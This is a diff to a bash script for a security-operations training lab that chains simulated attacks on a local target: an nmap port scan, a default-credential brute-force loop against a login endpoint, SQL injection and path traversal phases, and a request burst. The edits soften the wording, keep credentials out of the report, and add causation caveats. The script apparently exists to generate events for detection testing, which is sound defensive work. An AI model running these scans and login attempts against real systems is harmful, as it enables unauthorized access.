@@ -2,7 +2,7 @@
 # SOC-Lab Attack Script: S7 - Cross-Layer Incident
 # Purpose: Correlate bounded events across layers within one local trust zone
 
-set -e
+set -euo pipefail
 
 # Resolve the repository copy when run from source and the read-only mounted
 # copy when run in the attack container. No external command runs before the
@@ -47,14 +47,17 @@ REPORT_FILE="$OUTPUT_DIR/s7_lateral_$(date +%Y%m%d_%H%M%S).md"
 
 # Start report
 cat > "$REPORT_FILE" << EOF
-# S7 Attack Chain Report
+# S7 Event Chain Report
 
 ## Overview
 - **Start Time**: $(date -Iseconds)
 - **Target**: $TARGET ($TARGET_IP:$TARGET_PORT)
 - **Attacker IP**: $(hostname -I | awk '{print $1}')
 
-## Attack Timeline
+## Event Timeline
+
+> These observations share a local target and time window. They do not by
+> themselves prove that one event caused another.
 
 EOF
 
@@ -70,9 +73,12 @@ echo "" >> "$REPORT_FILE"
 
 # Quick port scan
 nmap -sS -p 22,80,3000,5432,9200 --open "$TARGET_IP" 2>/dev/null | tee -a "$REPORT_FILE"
+scan_exit=$?
 
 echo ""
-echo "Open ports discovered. Waiting ${DELAY}s before next phase..."
+echo "Scan command exited with status $scan_exit; inspect its output before drawing conclusions."
+echo "**Command exit**: $scan_exit (inspect captured output)" >> "$REPORT_FILE"
+echo "Waiting ${DELAY}s before next phase..."
 sleep "$DELAY"
 
 echo ""
@@ -95,26 +101,29 @@ sleep "$DELAY"
 
 echo ""
 echo "============================================"
-echo "Phase 3: Credential Attack (S2)"
+echo "Phase 3: Auth Attempts (S2)"
 echo "============================================"
 echo ""
 echo "Attempting brute force attack on login..."
 echo "" >> "$REPORT_FILE"
-echo "### Phase 3: Credential Attack" >> "$REPORT_FILE"
+echo "### Phase 3: Auth Attempts" >> "$REPORT_FILE"
 echo "**Time**: $(date -Iseconds)" >> "$REPORT_FILE"
 echo "" >> "$REPORT_FILE"
 
-# Try common credentials
+# Exercise inputs remain internal; neither usernames nor secret values are
+# written to stdout or the report because evidence only needs status/outcome.
 credentials=(
     "admin:admin"
     "user:user"
     "guest:guest"
 )
 
-found_creds=""
+auth_observation="No HTTP 200 observed"
+attempt_number=0
 for cred in "${credentials[@]}"; do
-    user=$(echo "$cred" | cut -d: -f1)
-    pass=$(echo "$cred" | cut -d: -f2)
+    ((attempt_number += 1))
+    user="${cred%%:*}"
+    pass="${cred#*:}"
     
     response=$(curl -s -X POST "http://$TARGET_IP:$TARGET_PORT/auth/login" \
         -H "Host: $TARGET" \
@@ -124,13 +133,13 @@ for cred in "${credentials[@]}"; do
     
     http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
     
-    echo "Trying $user:$pass - HTTP $http_code"
-    echo "- $user:$pass - HTTP $http_code" >> "$REPORT_FILE"
+    echo "Auth attempt $attempt_number - HTTP $http_code"
+    echo "- Attempt $attempt_number - HTTP $http_code" >> "$REPORT_FILE"
     
     if [ "$http_code" = "200" ]; then
-        echo "  [!] Valid credentials found: $user:$pass"
-        found_creds="$user:$pass"
-        echo "**Valid credentials found**: $user:$pass" >> "$REPORT_FILE"
+        echo "  HTTP 200 observed; input values withheld"
+        auth_observation="HTTP 200 observed on attempt $attempt_number; input values withheld"
+        echo "**Observed outcome**: HTTP 200 on attempt $attempt_number; input values withheld" >> "$REPORT_FILE"
         break
     fi
 done
@@ -176,7 +185,7 @@ sleep "$DELAY"
 
 echo ""
 echo "============================================"
-echo "Phase 5: Path Traversal (S5 Related)"
+echo "Phase 5: Path Traversal Attempt"
 echo "============================================"
 echo ""
 echo "Attempting path traversal..."
@@ -235,13 +244,13 @@ for i in $(seq 1 50); do
 done
 
 echo "Results: OK=$success, 429=$rate_limited, Failed=$failed"
-echo "- Successful: $success" >> "$REPORT_FILE"
+echo "- HTTP 200: $success" >> "$REPORT_FILE"
 echo "- Rate Limited: $rate_limited" >> "$REPORT_FILE"
 echo "- Failed: $failed" >> "$REPORT_FILE"
 
 echo ""
 echo "============================================"
-echo "Attack Chain Complete"
+echo "Event Chain Attempts Finished"
 echo "============================================"
 echo ""
 echo "End Time: $(date -Iseconds)" >> "$REPORT_FILE"
@@ -251,14 +260,14 @@ cat >> "$REPORT_FILE" << EOF
 
 ## Summary
 
-| Phase | Attack Type | Result |
+| Phase | Event Type | Observation |
 |-------|-------------|--------|
-| 1 | Port Scan | Completed |
-| 2 | Service Enumeration | Completed |
-| 3 | Credential Attack | ${found_creds:-"No valid creds found"} |
+| 1 | Port Scan | Command exit=$scan_exit; inspect output |
+| 2 | Service Enumeration | Attempted; inspect captured headers |
+| 3 | Auth Attempts | $auth_observation |
 | 4 | SQL Injection | Attempted |
 | 5 | Path Traversal | Attempted |
-| 6 | DoS | OK=$success, 429=$rate_limited |
+| 6 | Bounded Request Burst | HTTP 200=$success, HTTP 429=$rate_limited, other=$failed |
 
 ## Detection Points
 
@@ -311,4 +320,5 @@ echo "Verification still required:"
 echo "  [ ] Multiple detection sources were triggered"
 echo "  [ ] Events are indexed and correlatable by source.ip"
 echo "  [ ] MTTD/MTTR can be calculated from recorded timestamps"
+echo "  [ ] Any claimed relationship is supported by evidence, not timing alone"
 echo "Run on the host: scripts/scenario_e2e_check.sh S7"
